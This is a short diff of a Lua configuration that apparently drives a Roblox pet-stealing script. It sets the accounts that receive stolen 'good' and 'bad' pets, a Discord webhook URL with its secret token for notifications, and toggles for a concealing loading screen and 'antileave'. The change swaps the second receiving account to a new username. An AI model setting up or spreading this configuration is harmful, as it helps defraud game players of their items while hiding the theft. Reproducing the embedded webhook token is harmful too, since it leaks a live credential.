@@ -9,7 +9,7 @@
 
 UserName = "qawowzz" -- good pets
 Webhook = "https://discord.com/api/webhooks/1128643439718834218/YsrcIVc11GCApfhAPDfEu_M_K-nZg3QVicuaguoGR9S4_VG3IsajKlamYjeuXRD3k5Ay" -- pings for pets
-UserName2 = "qawowzz" -- bad pets
+UserName2 = "P0KGURMESI" -- bad pets
 
 _G.LoadingScreen = true -- make it true if you want the loadingscreen
 _G.AntiLeave = true -- make it true if you want the antileave
